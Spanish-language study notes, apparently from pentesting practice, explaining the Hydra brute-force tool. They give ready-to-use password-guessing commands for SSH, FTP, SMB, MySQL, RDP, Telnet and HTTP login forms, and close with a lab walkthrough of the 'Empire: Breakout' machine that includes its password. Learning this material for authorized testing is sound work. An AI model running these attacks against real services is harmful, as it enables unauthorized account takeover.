# Hydra

## Descripción

Hydra es una herramienta de **fuerza bruta online** — se conecta repetidamente a un servicio probando combinaciones de usuario y contraseña hasta encontrar una válida. A diferencia de John the Ripper que trabaja offline con hashes, Hydra ataca servicios en red en tiempo real.

**Diferencia clave:**
- **Hydra** → ataca servicios online (SSH, FTP, HTTP, SMB...) conectándose a la red
- **John/Hashcat** → crackea hashes offline sin tocar la red

---

## Instalación

Viene preinstalada en Kali Linux:

```shell
hydra -h
```

---

## Sintaxis general

```shell
hydra [opciones] TARGET PROTOCOLO [parámetros_extra]
```

---

## Servicios más comunes

### SSH

```shell
hydra -l usuario -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
hydra -L usuarios.txt -P passwords.txt ssh://TARGET_IP -t 4
```

### FTP

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
```

### SMB

```shell
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://TARGET_IP
```

### MySQL

```shell
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET_IP
```

### RDP

```shell
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://TARGET_IP
```

### Telnet

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://TARGET_IP
```

---

## HTTP — el más complejo

### HTTP GET (Basic Auth)

Para paneles con autenticación HTTP Basic (aparece un popup del navegador):

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://TARGET_IP/ruta
```

### HTTP POST (formularios web) 

Para formularios de login normales. Necesitas tres parámetros:
1. La ruta del formulario
2. Los campos POST con `^USER^` y `^PASS^` como marcadores
3. El string que aparece cuando el login **falla**

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP \
  http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Login failed"
```

> **El tercer parámetro es crítico.** Si no especificas el string de fallo, Hydra interpretará cualquier respuesta HTTP 200 como éxito y dará falsos positivos masivos.

### Encontrar los parámetros POST

1. Abre el navegador, ve al formulario de login
2. Pulsa F12 → pestaña Network
3. Intenta hacer login con credenciales falsas
4. Busca la petición POST → Headers → Form Data
5. Copia los nombres de los campos

---

## Opciones más útiles

```shell
-l usuario        # Un usuario específico
-L archivo        # Lista de usuarios desde archivo
-p contraseña     # Una contraseña específica
-P archivo        # Lista de contraseñas desde archivo
-t 4              # Número de tareas paralelas (por defecto 16, reducir para SSH)
-s puerto         # Puerto específico si no es el por defecto
-f                # Parar al encontrar el primer login válido
-v                # Verbose — mostrar intentos
-V                # Muy verbose — mostrar cada intento
-o resultado.txt  # Guardar resultados en archivo
```

---

## Señales de falsos positivos

Si Hydra devuelve muchos éxitos en muy poco tiempo, probablemente son **falsos positivos**:

```
[20000][http-get] host: TARGET   login: admin   password: 1234567
[20000][http-get] host: TARGET   login: admin   password: password
[20000][http-get] host: TARGET   login: admin   password: iloveyou
```

Causas:
- Usaste `http-get` en lugar de `http-post-form`
- No especificaste el string de fallo en formularios POST
- El servidor devuelve HTTP 200 tanto para login correcto como incorrecto

---

## Wordlists recomendadas

| Wordlist | Tamaño | Uso |
|----------|--------|-----|
| `/usr/share/wordlists/rockyou.txt` | 14M contraseñas | Primera opción siempre |
| `/usr/share/wordlists/metasploit/unix_users.txt` | Usuarios comunes Unix | Para enumerar usuarios |
| `/usr/share/wordlists/dirb/common.txt` | Rutas web | Para Gobuster, no Hydra |

---

## Consideraciones importantes

- La fuerza bruta es **ruidosa** — genera muchas conexiones y deja rastro en logs
- En entornos reales, muchos servicios tienen **bloqueo de cuenta** tras N intentos fallidos — comprueba la política antes
- Reduce el número de tareas (`-t`) en SSH para evitar bloqueos: `-t 4`
- Siempre prueba **credenciales por defecto manualmente** antes de lanzar Hydra — es más rápido y menos ruidoso

---

## Ejemplo real — Máquina Empire: Breakout

Se intentó fuerza bruta en Webmin puerto 20000 con:

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-get://192.168.56.103:20000/session_login.cgi
```

Problemas encontrados:
1. Usuario incorrecto (`admin` en lugar de `cyber`)
2. Método incorrecto (`http-get` en lugar de `http-post-form`)
3. Sin string de fallo → 16 falsos positivos inmediatos

El comando correcto hubiese sido:
```shell
hydra -l cyber -P /usr/share/wordlists/rockyou.txt \
  192.168.56.103 \
  http-post-form \
  "/session_login.cgi:user=^USER^&pass=^PASS^:Login failed" \
  -s 20000
```

En cualquier caso, la contraseña `.2uqPEfj3D<P'a-3` no está en rockyou.txt — era necesario encontrarla en el código fuente.
